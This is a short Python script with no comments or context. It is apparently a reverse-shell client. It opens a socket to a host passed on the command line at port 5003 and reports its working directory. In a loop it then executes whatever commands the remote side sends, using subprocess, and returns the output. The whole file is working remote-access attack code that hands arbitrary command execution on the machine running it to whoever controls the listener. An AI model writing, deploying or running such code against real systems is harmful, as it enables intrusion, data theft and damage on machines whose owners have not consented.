import socket
import os
import subprocess
import sys

host = sys.argv[1]
port = 5003
buff = 1024 * 128 
separator = "<sep>"

s = socket.socket()
s.connect((host, port))
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(buff).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{separator}{cwd}"
    s.send(message.encode())
s.close()